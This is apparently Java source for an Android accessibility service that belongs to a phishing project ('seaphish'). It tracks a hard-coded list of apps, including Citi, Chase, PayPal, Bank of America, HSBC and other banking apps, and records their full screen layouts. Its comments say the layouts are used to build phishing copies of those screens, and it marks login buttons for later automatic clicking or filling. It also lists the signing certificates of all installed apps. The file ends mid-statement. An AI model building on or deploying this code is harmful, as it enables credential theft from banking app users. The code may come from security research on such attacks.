package example.com.seaphish.uicarise.writenodesxml;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.os.Build;
import android.os.Environment;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import org.w3c.dom.Document;
import org.w3c.dom.Element;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;


/* The accessibility service created below is to monitor the events happening on the mobile phone
 * Example of events can be: opening an app, clicking any button on app etc.
  * This service requires the permission to read the window contents and thus
  * the main purpose of this service is to fetch the GUI hierarchy of an app.
  * All the tracked GUI elements are stored in a file, which is stored in the smartphone memory
  * The files are not stored on the SD card since the size of the file will be very small.*/
public class Service_WriteXML extends AccessibilityService {

    /* For tracking all apps, we only focus on two events which helps in giving the GUI Hierarchy.
     * We maintain two lists for two different events - both related to contents changed on the window
      * when an app is loaded. The two events have event id as: 2048 and 32*/

    static List<String> allNodesInfo_2048 = new ArrayList<>();
    static List<String> allNodesInfo_32 = new ArrayList<>();

    int calledEvent = 0;
    int buttonClicked = -1;
    Document doc = null;
    File myInternalXML = null;
    String noNullSourceEvents = "";
    static List<String> packageName_Track = new ArrayList<>();
    static List<String> savedPackages = new ArrayList<>();

    AccessibilityNodeInfo passwordNode = null;
    AccessibilityNodeInfo signOnButtonNode = null;

    // root element
    Element rootElement = null;

    String filepath = "MyFileStorage";
    File myInternalFile = null;


    ContextWrapper contextWrapper ;
    File directory;

    String filename = "TestFile.txt";
    String newPageFile = "";

    static List<String> allPackageFiles = new ArrayList<>();

    public Service_WriteXML() {
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event)
    {
        String currentPackageName = "";

        int eventType = event.getEventType();
        if(event.getPackageName() != null && event.getPackageName() != "") {
            currentPackageName = event.getPackageName().toString();
            //System.out.println("In screen : "+currentPackageName);
            String tempPackage = currentPackageName.replace(".","_");
            //System.out.println("Temp Package name: "+tempPackage);
            if(!allPackageFiles.contains(tempPackage))
            {
                allPackageFiles.add(tempPackage);
            }
        }

//        System.out.println("************************************************************************************************************************************************************************************************************************");
//        System.out.println("Event Type: "+eventType);
//        System.out.println("************************************************************************************************************************************************************************************************************************");

        //getEventType(eventType);


        AccessibilityNodeInfo source = null;


        AccessibilityWindowInfo currWindow = null;
        int child;

        source = event.getSource();
        if(source != null) {

            //System.out.println("Print source :" + source.toString());
            currWindow = source.getWindow();
            //System.out.println("Print Window :" + currWindow);
            noNullSourceEvents = (noNullSourceEvents + "_" +eventType).toString();
            //System.out.println("Events when source is not null: "+noNullSourceEvents);
        }

        if(eventType == 4194304 && newPageFile.equals("done") && buttonClicked == -1)
        {
            filename="TestFile.txt";
            System.out.println("done");
            newPageFile = "";
        }

        if(packageName_Track.contains(currentPackageName))
        {
            getEventType(eventType);
            String tempFileName = currentPackageName.replace(".","_") + ".txt" ;
            System.out.println("temp File name: "+tempFileName+ " Current filename: "+filename + " called event: "+calledEvent+ " event type: "+eventType);
            //System.out.println("New Temp File name: "+tempFileName);


            if((!filename.equals(tempFileName)) && (eventType == 2048 || eventType == 32))
            {
                System.out.println("filename.contains(_click_)"+filename.contains("_click_"));

                if( filename.contains("_click_")  )
                {
                    //myInternalFile = new File(directory, filename);
                    String[] tempStr1 = filename.split("_click");
                    String tempStr2 = currentPackageName.replace(".","_");

                    System.out.println("filename split: "+tempStr1[0]);
                    System.out.println("current package: "+tempStr2);

                    System.out.println("str1 contains str2 : "+tempStr1[0].equals(tempStr2));

                    if(tempStr1[0].equals(tempStr2))
                        System.out.println("New Page: New filename with _click_: " + filename);
                    else
                    {
                        filename = tempFileName;
                        myInternalFile = new File(directory, filename);
                        System.out.println("New Package : New filename: " + filename);
                    }
                }
                else
                {
                    calledEvent = 0;
                    filename = tempFileName;
                    myInternalFile = new File(directory, filename);
                    System.out.println("New Package : New filename: " + filename);
                }

                buttonClicked = -1;
            }
            /* if a button is clicked in the app - then get all the details in other file instead of appending it in the same file */
            else if(calledEvent > 1 && eventType == 1 && filename.equals(tempFileName))
            {
                buttonClicked++;
                if(source != null && (source.getClassName().equals("android.widget.Button") || source.getClassName().equals("android.widget.TextView")))
                {
                    System.out.println("source : content desc "+source.getContentDescription() + " class name :"+ source.getClassName() + " text: "+source.getText());

                    if(source.getText() != null && !source.getText().equals("null") && !source.getText().equals(""))
                    {
                        newPageFile = currentPackageName.replace(".", "_") + "_click_" + source.getText().toString().replace(" ","") + ".txt";
                        System.out.println("On button/textview click : new file name from text: "+newPageFile);
                    }
                    else if(source.getContentDescription() != null && !source.getContentDescription().equals("null") && !source.getContentDescription().equals(""))
                    {
                        newPageFile = currentPackageName.replace(".", "_") + "_click_" + source.getContentDescription().toString().replace(" ","")  + ".txt";
                        System.out.println("On button/textview click : new file name from content description: "+newPageFile);
                    }
                    else if(source.getViewIdResourceName() != null && !source.getViewIdResourceName().equals("null") && !source.getViewIdResourceName().equals(""))
                    {
                        String[] tempResID = source.getViewIdResourceName().toString().split("/");
                        if(tempResID.length == 2)
                            newPageFile = currentPackageName.replace(".", "_") + "_click_" + tempResID[1] + ".txt";
                        else
                            newPageFile = currentPackageName.replace(".", "_") + "_click_1" + ".txt";
                        System.out.println("On button/textview click : new file name from view id resource name: "+newPageFile);
                    }
                    else
                    {
                        newPageFile = currentPackageName.replace(".", "_") + "_click_1" + ".txt";
                        System.out.println("On button click : new file name from blank: "+newPageFile);
                    }
                }
            }
            else if(buttonClicked > -1 && (eventType == 2048 || eventType == 32) && filename.equals(tempFileName))
            {
                filename = newPageFile ;
                buttonClicked = -1;
                System.out.println("Service: New filename after button click: "+filename);
                newPageFile = "done";
                myInternalFile = new File(directory, filename);
            }

            if (eventType == 2048)
            {
                calledEvent++;
                if (source != null) {
                    allNodesInfo_2048 = new ArrayList<>();
                    allNodesInfo_2048.add(source.toString());
                    getAllNodes(source, 2048);

                }
            } else if (eventType == 32) {
                calledEvent++;

                if (source != null) {

                    allNodesInfo_32 = new ArrayList<>();
                    allNodesInfo_32.add(source.toString());
                    getAllNodes(source, 32);

                }
            }

            /* log the information when eventType is 32 or 2048 */
            if (eventType == 32 || eventType == 2048 && calledEvent > 1) {
                FileOutputStream fos = null;

                int count = 0;
                try {
                    System.out.println("Writing in file: "+myInternalFile.getAbsolutePath());

                    if(!savedPackages.contains(filename)) {
                        savedPackages.add(filename);
                    }

                        fos = new FileOutputStream(myInternalFile);

                        /* Write all the GUI nodes as added in the two events list */
                        for (String eachNode : allNodesInfo_32) {
                            System.out.println("*********Event : 32 Node at: " + count + " is: " + eachNode.replace("\n", " ").trim() + "********");
                            count++;

                            String tempData = count + " ; " + eachNode.replace("\n", " ").trim() + " ;END";
                            fos.write(tempData.getBytes());
                            fos.write(System.lineSeparator().getBytes());
                        }

                        //count = 0;
                        for (String eachNode : allNodesInfo_2048) {
                            System.out.println("*********Event : 2048 Node at: " + count + " is: " + eachNode.replace("\n", " ").trim() + "********");
                            count++;

                            String tempData = count + " ; " + eachNode.replace("\n", " ").trim() + " ;END";
                            fos.write(tempData.trim().getBytes());
                            fos.write(System.lineSeparator().getBytes());
                        }

                } catch (Exception ex) {

                } finally {
                    try {
                        if (fos != null)
                            fos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                /* Verify al the tracked GUI nodes from the recently written file */
                try {
                    System.out.println("Reading from file: "+myInternalFile.getAbsolutePath());

                    StringBuilder myData = new StringBuilder();
                    FileInputStream fis = new FileInputStream(myInternalFile);

                    InputStreamReader in = new InputStreamReader(fis);
                    BufferedReader br = new BufferedReader(in);
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        myData.append(strLine);

                        System.out.println("Line : " + strLine);
                    }
                    in.close();


                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }

    }

    /* This method will fetch the certificate and all signatures for all the apps that are installed on the smartphone */
    private void GetHashCodeforOpenedApp()
    {
        StringBuilder sb = new StringBuilder();

        final PackageManager packageManager = contextWrapper.getPackageManager();
        final List<PackageInfo> packageList = packageManager.getInstalledPackages(PackageManager.GET_SIGNATURES);

        for (PackageInfo p : packageList) {
            final String strName = p.applicationInfo.loadLabel(packageManager).toString();
            //System.out.println("Application info: "+strName);
            final String strVendor = p.packageName;
            //System.out.println("Package Name: "+strVendor);

            sb.append("<br> Type of Application: " + strName + " / Package Name: " + strVendor + "<br>");
            System.out.println("*********************************************************");
            System.out.println("Type of Application: " + strName + " / Package Name: " + strVendor);

            final Signature[] arrSignatures = p.signatures;
            for (final Signature sig : arrSignatures)
            {
        /*
        * Get the X.509 certificate.
        */
                final byte[] rawCert = sig.toByteArray();
                //System.out.println("signature hash code: "+sig.hashCode());
                InputStream certStream = new ByteArrayInputStream(rawCert);

                try {
                    CertificateFactory certFactory = CertificateFactory.getInstance("X509");
                    X509Certificate x509Cert = (X509Certificate) certFactory.generateCertificate(certStream);

                    sb.append("Certificate subject Unique Id: " + x509Cert.getSubjectUniqueID() + "<br>");
                    sb.append("Certificate subject: " + x509Cert.getSubjectDN() + "<br>");
                    sb.append("Certificate issuer: " + x509Cert.getIssuerDN() + "<br>");
                    sb.append("Certificate issuer unique ID: " + x509Cert.getIssuerUniqueID() + "<br>");
                    sb.append("Certificate serial number: " + x509Cert.getSerialNumber() + "<br>");
                    sb.append("Certificate - TBS: " + x509Cert.getTBSCertificate() + "<br>");
                    sb.append("Certificate - Version: " + x509Cert.getVersion() + "<br>");
                    sb.append("Signatue: " + x509Cert.getSignature() + "<br>");
                    sb.append("Signatue Hash Code: " + sig.hashCode() + "<br>");


                    sb.append("<br>");

                    System.out.println("Certificate subject Unique Id: " + x509Cert.getSubjectUniqueID() );
                    System.out.println("Certificate subject: " + x509Cert.getSubjectDN() );
                    System.out.println("Certificate issuer: " + x509Cert.getIssuerDN() );
                    System.out.println("Certificate issuer unique ID: " + x509Cert.getIssuerUniqueID());
                    System.out.println("Certificate serial number: " + x509Cert.getSerialNumber());
                    System.out.println("Certificate - TBS: " + x509Cert.getTBSCertificate() );
                    System.out.println("Certificate - Version: " + x509Cert.getVersion());
                    System.out.println("Signatue: " + x509Cert.getSignature() );
                    System.out.println("Signatue Hash Code: " + sig.hashCode()+ " "+x509Cert.hashCode() );


                    System.out.println("*********************************************************");

                }
                catch (CertificateException e) {
                    // e.printStackTrace();
                }
            }
        }
        //System.out.println("Final all values:"+sb.toString());

    }


    /* The below functions are commented. Previously were used to build the phishing apps XML layout file directly
    * The code is now replaced with another class that generates the phishing app GUI using Java code behind methodology*/

//    private void CreateXML(String nodeInfo)
//    {
//        List<String> classNames = new ArrayList<>();
//        List<String> contentDesc = new ArrayList<>();
//        List<String> textDesc = new ArrayList<>();
//
//        String xmlFileName = "MySampleLogin.xml";
//        String xmlFilepath = "MyFileStorage";
//
//
//        ContextWrapper contextWrapper = new ContextWrapper(this.getApplicationContext());
//        File directory = null;
//        File checkFiles = contextWrapper.getFilesDir();
//
//        if(checkFiles != null)
//            //System.out.println("files in get files in dir: "+checkFiles.getPath());
//        if(nodeInfo.equals(""))
//        {
//            //System.out.println("In private mode");
//            directory = contextWrapper.getDir(xmlFilepath, Context.MODE_PRIVATE);
//        }
//        else
//        {
//            //System.out.println("In append mode");
//            directory = contextWrapper.getDir(xmlFilepath, Context.MODE_APPEND);
//        }
//
//        myInternalXML = null;
//        myInternalXML = new File(directory, xmlFileName);
//
//        try {
//
//            if(nodeInfo.equals(""))
//            {
//
//                dbFactory = DocumentBuilderFactory.newInstance();
//
//                dBuilder = dbFactory.newDocumentBuilder();
//
//                doc = dBuilder.newDocument();
//                // root element
//                rootElement = doc.createElement("LinearLayout");
//                doc.appendChild(rootElement);
//
//                // setting attribute to element
//                Attr attr = doc.createAttribute("xmlns:android");
//                attr.setValue("http://schemas.android.com/apk/res/android");
//                rootElement.setAttributeNode(attr);
//
//                attr = doc.createAttribute("xmlns:tools");
//                attr.setValue("http://schemas.android.com/tools");
//                rootElement.setAttributeNode(attr);
//
//                attr = doc.createAttribute("android:layout_width");
//                attr.setValue("wrap_content");
//                rootElement.setAttributeNode(attr);
//
//                attr = doc.createAttribute("android:layout_height");
//                attr.setValue("match_parent");
//                rootElement.setAttributeNode(attr);
//
//                attr = doc.createAttribute("android:paddingBottom");
//                attr.setValue("@dimen/activity_vertical_margin");
//                rootElement.setAttributeNode(attr);
//
//                attr = doc.createAttribute("android:paddingLeft");
//                attr.setValue("@dimen/activity_horizontal_margin");
//                rootElement.setAttributeNode(attr);
//
//                attr = doc.createAttribute("android:paddingRight");
//                attr.setValue("@dimen/activity_horizontal_margin");
//                rootElement.setAttributeNode(attr);
//
//                attr = doc.createAttribute("android:paddingTop");
//                attr.setValue("@dimen/activity_vertical_margin");
//                rootElement.setAttributeNode(attr);
//
//                /*attr = doc.createAttribute("tools:context");
//                attr.setValue("@dimen/activity_vertical_margin");
//                rootElement.setAttributeNode(attr);*/
//
//                attr = doc.createAttribute("android:orientation");
//                attr.setValue("vertical");
//                rootElement.setAttributeNode(attr);
//            }
//            else
//            {
//                String[] splitNode = nodeInfo.split(";");
//                for(String eachSplitNode : splitNode)
//                {
//                    if(eachSplitNode.contains("className"))
//                    {
//                        String[] tempNode = eachSplitNode.split(":");
//                        //System.out.println("value after split: for className: "+tempNode[1]);
//                        classNames.add(tempNode[1]);
//                    }
//                    else if(eachSplitNode.contains("contentDescription"))
//                    {
//                        String[] tempNode = eachSplitNode.split(":");
//                        //System.out.println("value after split: for contentDescription: "+tempNode[1]);
//                        contentDesc.add(tempNode[1]);
//                    }
//                    else if(eachSplitNode.contains("text"))
//                    {
//                        String[] tempNode = eachSplitNode.split(":");
//                        //System.out.println("value after split: for contentDescription: "+tempNode[1]);
//                        textDesc.add(tempNode[1]);
//                    }
//                }
//
//                for(int count = 0 ; count < classNames.size(); count++)
//                {
//                    System.out.println("Class name in switch case: "+classNames.get(count));
//
//                    if(classNames.get(count).contains("android.widget.Button"))
//                    {
//                        //System.out.println("inside button");
//                        Element btnViewChild = doc.createElement("Button");
//                        rootElement.appendChild(btnViewChild);
//
//                        Attr btnAttr = doc.createAttribute("android:text");
//                        if(contentDesc.get(count) != null && (!contentDesc.get(count).equals("")))
//                            btnAttr.setValue(contentDesc.get(count));
//                        if(textDesc.get(count) != null && (!textDesc.get(count).equals("")))
//                            btnAttr.setValue(textDesc.get(count));
//
//                        btnViewChild.setAttributeNode(btnAttr);
//
//                        btnAttr = doc.createAttribute("android:layout_width");
//                        btnAttr.setValue("match_parent");
//                        btnViewChild.setAttributeNode(btnAttr);
//
//                        btnAttr = doc.createAttribute("android:layout_height");
//                        btnAttr.setValue("wrap_content");
//                        btnViewChild.setAttributeNode(btnAttr);
//
//                    }
//
//
//
//                    else if(classNames.get(count).contains("android.widget.EditText"))
//                    {
//                        //System.out.println("inside edit text ");
//                        Element editViewChild = doc.createElement("EditText");
//                        rootElement.appendChild(editViewChild);
//
//                        Attr editAttr = doc.createAttribute("android:contentDescription");
//                        editAttr.setValue(contentDesc.get(count));
//                        editViewChild.setAttributeNode(editAttr);
//
//                        editAttr = doc.createAttribute("android:text");
//                        editAttr.setValue(textDesc.get(count));
//                        editViewChild.setAttributeNode(editAttr);
//
//                        editAttr = doc.createAttribute("android:layout_width");
//                        editAttr.setValue("match_parent");
//                        editViewChild.setAttributeNode(editAttr);
//
//                        editAttr = doc.createAttribute("android:layout_height");
//                        editAttr.setValue("wrap_content");
//                        editViewChild.setAttributeNode(editAttr);
//                    }
//
//                    else if(classNames.get(count).contains("android.widget.View"))
//                    {
//                        //System.out.println("inside view");
//                        if (!(contentDesc.get(count).equals(""))) {
//                            Element viewViewChild = doc.createElement("View");
//                            rootElement.appendChild(viewViewChild);
//
//                            Attr viewAttr = doc.createAttribute("android:contentDescription");
//                            viewAttr.setValue(contentDesc.get(count));
//                            viewViewChild.setAttributeNode(viewAttr);
//
//                            viewAttr = doc.createAttribute("android:text");
//                            viewAttr.setValue(textDesc.get(count));
//                            viewViewChild.setAttributeNode(viewAttr);
//
//                            viewAttr = doc.createAttribute("android:layout_width");
//                            viewAttr.setValue("match_parent");
//                            viewViewChild.setAttributeNode(viewAttr);
//
//                            viewAttr = doc.createAttribute("android:layout_height");
//                            viewAttr.setValue("wrap_content");
//                            viewViewChild.setAttributeNode(viewAttr);
//                        }
//                    }
//
//                    else if(classNames.get(count).contains("android.widget.TextView"))
//                    {
//                        //System.out.println("inside text view");
//                        Element textViewChild = doc.createElement("TextView");
//                        rootElement.appendChild(textViewChild);
//
//                        Attr textAttr = doc.createAttribute("android:text");
//                        textAttr.setValue(contentDesc.get(count));
//                        textViewChild.setAttributeNode(textAttr);
//
//                        textAttr = doc.createAttribute("android:text");
//                        textAttr.setValue(textDesc.get(count));
//                        textViewChild.setAttributeNode(textAttr);
//
//                        textAttr = doc.createAttribute("android:layout_width");
//                        textAttr.setValue("match_parent");
//                        textViewChild.setAttributeNode(textAttr);
//
//                        textAttr = doc.createAttribute("android:layout_height");
//                        textAttr.setValue("wrap_content");
//                        textViewChild.setAttributeNode(textAttr);
//                    }
//                    else if(classNames.get(count).contains("android.widget.CheckBox"))
//                    {
//                        //System.out.println("inside text view");
//                        Element chkBoxViewChild = doc.createElement("CheckBox");
//                        rootElement.appendChild(chkBoxViewChild);
//
//                        Attr chkBoxAttr = doc.createAttribute("android:contentDescription");
//                        chkBoxAttr.setValue(contentDesc.get(count));
//                        chkBoxViewChild.setAttributeNode(chkBoxAttr);
//
//                        chkBoxAttr = doc.createAttribute("android:text");
//                        chkBoxAttr.setValue(textDesc.get(count));
//                        chkBoxViewChild.setAttributeNode(chkBoxAttr);
//
//                        chkBoxAttr = doc.createAttribute("android:layout_width");
//                        chkBoxAttr.setValue("match_parent");
//                        chkBoxViewChild.setAttributeNode(chkBoxAttr);
//
//                        chkBoxAttr = doc.createAttribute("android:layout_height");
//                        chkBoxAttr.setValue("wrap_content");
//                        chkBoxViewChild.setAttributeNode(chkBoxAttr);
//                    }
//
//
//                }
//
//            }
//
//            // write the content into xml file
//            TransformerFactory transformerFactory = TransformerFactory.newInstance();
//            Transformer transformer = transformerFactory.newTransformer();
//            DOMSource source = new DOMSource(doc);
//
//            StreamResult result = new StreamResult(myInternalXML);
//            transformer.transform(source, result);
//            // Output to console for testing
//            /*StreamResult consoleResult = new StreamResult(System.out);
//            System.out.println("check the XML &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  data");
//            transformer.transform(source, consoleResult);
//
//            System.out.println("check the XML &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  data");*/
//
//            //reading text from file
//
//        }
//        catch(Exception ex)
//        {
//            ex.printStackTrace();
//
//        }
//
//    }

    /* Recursively iterate from the parent node to all child nodes and add the nodes to the lists*/
    public AccessibilityNodeInfo getAllNodes(AccessibilityNodeInfo source, int event)
    {
        if(source != null)
        {
            if(source.getClassName() != null && source.getClassName().toString().contains("Button") && source.getText() != null && source.getText().toString().toLowerCase().contains("log"))
            {
                System.out.println("found log on button "+source);
                signOnButtonNode = source;
            }

            /* The below code can be used to target any one element of GUI. For example if we want to locate the
             * a button with some text/id/description that you already know - the below line of code
              * fetches the sign on button from one of the properties of nodes. This saved buttons instance
              * can be used later to perform any operation like automatic click or if we are focussing on a text box,
              * we can autofill the text box etc. */
            /*if(source.getViewIdResourceName() != null && source.getViewIdResourceName().toString().equals("signonbutton"))
            {
                System.out.println("found sign on button "+source);
                signOnButtonNode = source;
            }*/


            /* If the current node fetched has children, then recursively iterate to fetch all children and all its
             * children's children. */
            if(source.getChildCount() > 0)
            {
                for(int allNodes = 0 ; allNodes < source.getChildCount() ; allNodes++)
                {
                    if(source.getChild(allNodes) != null) {
                        if(event == 2048)
                           allNodesInfo_2048.add((String.valueOf(source.getChild(allNodes))).replace("\n"," "));
                        else if(event == 32)
                            allNodesInfo_32.add((String.valueOf(source.getChild(allNodes))).replace("\n"," "));
                    }

                    getAllNodes(source.getChild(allNodes),event);
                }
            }
            else
                return source;
        }
        return source;
    }

    /* Understand the event type happening on the smartphone screen using the accessibility events */
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public void getEventType(int eventType)
    {
        switch(eventType)
        {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                System.out.println(eventType+ ": TYPE_VIEW_TEXT_CHANGED ");
                break;

            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                System.out.println(eventType+ ": TYPE_WINDOWS_CHANGED");
                break;

            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                System.out.println(eventType+ ": TYPE_VIEW_CLICKED");
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                System.out.println(eventType+ ": TYPE_VIEW_FOCUSED ");
                break;

            case AccessibilityEvent.CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION:
                System.out.println(eventType+ ": CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION");
                break;

            case AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT:
                System.out.println(eventType+ ": CONTENT_CHANGE_TYPE_TEXT");
                break;

            case AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED:
                System.out.println(eventType+ ": CONTENT_CHANGE_TYPE_UNDEFINED");
                break;

            case AccessibilityEvent.INVALID_POSITION:
                System.out.println(eventType+ ": INVALID_POSITION");
                break;

            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                System.out.println(eventType+ ": TYPE_ANNOUNCEMENT");
                break;

            case AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT:
                System.out.println(eventType+ ": TYPE_ASSIST_READING_CONTEXT");
                break;

            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                System.out.println(eventType+ ": TYPE_GESTURE_DETECTION_END");
                break;

            case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                System.out.println(eventType+ ": TYPE_GESTURE_DETECTION_START");
                break;

            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                System.out.println(eventType+ ": TYPE_NOTIFICATION_STATE_CHANGED");
                break;

            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                System.out.println(eventType+ ": TYPE_TOUCH_EXPLORATION_GESTURE_END");
                break;

            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                System.out.println(eventType+ ": TYPE_TOUCH_EXPLORATION_GESTURE_START");
                break;

            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END:
                System.out.println(eventType+ ": TYPE_TOUCH_INTERACTION_END");
                break;

            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START:
                System.out.println(eventType+ ": TYPE_TOUCH_INTERACTION_START");
                break;

            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                System.out.println(eventType+ ": TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED");
                break;

            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                System.out.println(eventType+ ": TYPE_VIEW_ACCESSIBILITY_FOCUSED");

            case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED:
                System.out.println(eventType+ ": TYPE_VIEW_CONTEXT_CLICKED");

            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                System.out.println(eventType+ ": TYPE_VIEW_HOVER_ENTER");
                break;

            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                System.out.println(eventType+ ": TYPE_VIEW_HOVER_EXIT");
                break;


            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                System.out.println(eventType+ ": TYPE_VIEW_SCROLLED");
                break;


            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                System.out.println(eventType+ ": TYPE_VIEW_TEXT_SELECTION_CHANGED");
                break;

            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                System.out.println( eventType+ ": TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY");
                break;

            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                System.out.println(eventType+ ": TYPE_WINDOW_CONTENT_CHANGED");
                break;

            //case AccessibilityEvent.TYPE_VIEW_SELECTED:
              //  System.out.println("TYPE_VIEW_SELECTED");
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                System.out.println(eventType+ ": TYPE_WINDOW_STATE_CHANGED");



        }
    }

    @Override
    public void onInterrupt() {

    }

    /* The below method is called only once - when the accessibility service is started on the phone
     * This can be used for intitializing any configurations that are required and that may be used in other methods.
      * For example : in this method we are intitializing a packageName_Track list which is responsible for monitoring
      * keeping a track of all apps that are required to be monitored. Packages added in this list are the only apps
      * for which phishing GUI is saved and built. Any new app that needs to be monitored can be added manually in this
      * list. It accpets the package name of the app - which is unique for each app. */
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    @Override
    public void onServiceConnected(){

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();

        System.out.println("inside onserviceConnected - 5");

        packageName_Track.add("com.citi.citimobile");
        packageName_Track.add("com.chase.sig.android");
        packageName_Track.add("com.github.pockethub.android");
        packageName_Track.add("org.jsl.wfwt");
        packageName_Track.add("com.gh4a");
        packageName_Track.add("com.sandklef.coachapp");
        packageName_Track.add("fr.free.nrw.commons");
        packageName_Track.add("studip.app");
        packageName_Track.add("org.mbs3.kjams.app");
        packageName_Track.add("com.pediy.bbs.kanxue");
        packageName_Track.add("jupiter.broadcasting.live.tv");
        packageName_Track.add("com.h4kr.fitocracy");
        packageName_Track.add("com.hexforhn.hex");
        packageName_Track.add("bf.io.openshop");
        packageName_Track.add("com.github.andlyticsproject");
        packageName_Track.add("com.BeeFramework.example");
        packageName_Track.add("org.github.OxygenGuide");
        packageName_Track.add("com.sensirion.smartgadget");
        packageName_Track.add("com.sep.planningpoker");
        packageName_Track.add("mpt.metafilter");
        //com.fernandocejas.example.android.nfc //sh.calaba.demoproject //no.niths.phonegap //nl.bneijt.tryhaskell //com.murrayc.galaxyzoo.app //de.naturalnet.mirwtfapp
        packageName_Track.add("com.fernandocejas.example.android.nfc");
        packageName_Track.add("sh.calaba.demoproject");
        packageName_Track.add("no.niths.phonegap");
        packageName_Track.add("nl.bneijt.tryhaskell");
        packageName_Track.add("com.murrayc.galaxyzoo.app");
        packageName_Track.add("de.naturalnet.mirwtfapp");

        packageName_Track.add("com.money.manager.ex.debug");
        packageName_Track.add("net.thomascannon.smsspoofer");
        packageName_Track.add("com.couchbase.grocerysync");
        packageName_Track.add("com.skarbo.wifimapper");
       // packageName_Track.add("example.com.seaphish.uicarise.writenodesxml");
        packageName_Track.add("com.example.seaphish.testapplication");
        packageName_Track.add("com.konylabs.capitalone");
        packageName_Track.add("com.infonow.bofa");
        packageName_Track.add("com.clairmail.fth");
        packageName_Track.add("com.htsu.hsbcpersonalbanking");
        packageName_Track.add("com.paypal.android.p2pmobile");
        packageName_Track.add("com.sbg.mobile.phone");
        packageName_Track.add("com.sbi.SBFreedom");


       /* info.packageNames = new String[]
                { "example.com.seaphish.uicarise.sampleapp_login", "com.citi.citimobile","com.chase.sig.android", "com.github.pockethub.android","org.jsl.wfwt","com.gh4a","com.sandklef.coachapp"};*/

        /* Register the accessibility service for the event types - what type of events it can track */

        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED | AccessibilityEvent.TYPES_ALL_MASK | AccessibilityEvent.CONTENT_CHANGE_TYPE_CONTENT_DESCRIPTION | AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE
                | AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT | AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED | AccessibilityEvent.INVALID_POSITION | AccessibilityEvent.TYPE_ANNOUNCEMENT | AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT |
                AccessibilityEvent.TYPE_GESTURE_DETECTION_END | AccessibilityEvent.TYPE_GESTURE_DETECTION_START | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED | AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END | AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START
                | AccessibilityEvent.TYPE_TOUCH_INTERACTION_END | AccessibilityEvent.TYPE_TOUCH_INTERACTION_START | AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT | AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED | AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED
                | AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED | AccessibilityEvent.TYPE_VIEW_HOVER_ENTER | AccessibilityEvent.TYPE_VIEW_HOVER_EXIT | AccessibilityEvent.TYPE_VIEW_LONG_CLICKED | AccessibilityEvent.TYPE_VIEW_SCROLLED | AccessibilityEvent.TYPE_VIEW_SELECTED
